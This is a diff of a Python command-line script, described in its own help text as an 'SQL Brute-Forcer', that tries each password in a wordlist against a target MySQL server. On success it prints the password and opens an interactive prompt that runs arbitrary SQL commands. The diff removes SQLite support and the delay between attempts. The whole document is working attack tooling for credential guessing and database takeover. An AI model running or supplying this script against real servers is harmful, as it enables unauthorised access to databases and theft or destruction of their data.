@@ -1,100 +1,67 @@
 import argparse
 import mysql.connector
-import sqlite3
+from colorama import Fore, Style, init
 import time
-from colorama import Fore, init
 
 # Initialize colorama
-init()
+init(autoreset=True)
 
-def try_mysql(target, username, password):
+# Function to handle connection and brute-force
+def brute_force_sql(username, password_list, target_ip):
     try:
-        conn = mysql.connector.connect(
-            host=target,
-            user=username,
-            password=password
-        )
-        conn.close()
-        return True
-    except mysql.connector.Error as err:
-        return False
+        for password in password_list:
+            print(Fore.YELLOW + f"Trying Passphrase: {password}")
+            try:
+                # Establish connection
+                connection = mysql.connector.connect(
+                    host=target_ip,
+                    user=username,
+                    password=password
+                )
+                # If successful connection, print key found
+                print(Fore.GREEN + f"KEY FOUND: [\"{password}\"]")
+                
+                # Execute commands after successful connection
+                while True:
+                    command = input(Fore.CYAN + "Enter SQL command (or type 'exit' to quit): ")
+                    if command.lower() == 'exit':
+                        break
+                    cursor = connection.cursor()
+                    cursor.execute(command)
+                    result = cursor.fetchall()
+                    for row in result:
+                        print(row)
+                    cursor.close()
 
-def try_sqlite(target, username, password):
-    try:
-        conn = sqlite3.connect(target)
-        return True
-    except sqlite3.Error as err:
-        return False
-
-def bruteforce_sql(target, username, password_list, db_type):
-    for password in password_list:
-        print(f"{Fore.YELLOW}Trying Passphrase: {password}{Fore.RESET}")
-        
-        if db_type == "mysql":
-            success = try_mysql(target, username, password)
-        elif db_type == "sqlite":
-            success = try_sqlite(target, username, password)
+                connection.close()
+                break  # Stop brute-forcing once the correct password is found
+            except mysql.connector.Error as err:
+                print(Fore.RED + f"Failed to connect with password {password}: {err}")
         else:
-            print(f"{Fore.RED}Invalid database type. Please use 'mysql' or 'sqlite'.{Fore.RESET}")
-            return
+            print(Fore.RED + "KEY NOT FOUND")
+    
+    except Exception as e:
+        print(Fore.RED + f"An error occurred: {e}")
 
-        if success:
-            print(f"{Fore.GREEN}KEY FOUND: [{password}]{Fore.RESET}")
-            return password
-        time.sleep(1)
-    
-    print(f"{Fore.RED}KEY NOT FOUND{Fore.RESET}")
-    return None
-
-def execute_sql_commands(target, db_type):
-    print(f"{Fore.CYAN}Connected! You can now execute SQL commands. Type 'exit' to quit.{Fore.RESET}")
-    
-    if db_type == "mysql":
-        conn = mysql.connector.connect(
-            host=target,
-            user=username,
-            password=password
-        )
-    elif db_type == "sqlite":
-        conn = sqlite3.connect(target)
-    else:
-        print(f"{Fore.RED}Invalid database type. Please use 'mysql' or 'sqlite'.{Fore.RESET}")
-        return
-    
-    cursor = conn.cursor()
-    
-    while True:
-        command = input(f"{Fore.CYAN}SQL Command> {Fore.RESET}")
-        if command.lower() == 'exit':
-            break
-        try:
-            cursor.execute(command)
-            if db_type == "mysql":
-                result = cursor.fetchall()
-                for row in result:
-                    print(row)
-            elif db_type == "sqlite":
-                print("Query executed successfully.")
-        except Exception as e:
-            print(f"{Fore.RED}Error: {str(e)}{Fore.RESET}")
-    
-    conn.close()
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="SQL Bruteforcer with execution capabilities.")
-    parser.add_argument("-l", "--username", required=True, help="Username for SQL connection")
-    parser.add_argument("-P", "--passwordlist", required=True, help="Path to password list file")
-    parser.add_argument("target", help="Target IP address or SQLite file path")
-    parser.add_argument("-t", "--type", choices=["mysql", "sqlite"], required=True, help="Database type (mysql or sqlite)")
+# Main function for argument parsing
+def main():
+    parser = argparse.ArgumentParser(description="SQL Brute-Forcer")
+    parser.add_argument('-l', '--username', required=True, help="Username for SQL login")
+    parser.add_argument('-P', '--passwordlist', required=True, help="Path to the password list file")
+    parser.add_argument('target', help="Target SQL Server IP")
 
     args = parser.parse_args()
 
-    # Read the password list
-    with open(args.passwordlist, "r") as f:
-        password_list = [line.strip() for line in f.readlines()]
+    # Read the password list from file
+    try:
+        with open(args.passwordlist, 'r') as file:
+            password_list = [line.strip() for line in file.readlines()]
+    except FileNotFoundError:
+        print(Fore.RED + "Password list file not found.")
+        return
 
-    # Bruteforce SQL
-    password = bruteforce_sql(args.target, args.username, password_list, args.type)
-    
-    if password:
-        execute_sql_commands(args.target, args.type)
+    # Start brute-forcing
+    brute_force_sql(args.username, password_list, args.target)
+
+if __name__ == '__main__':
+    main()
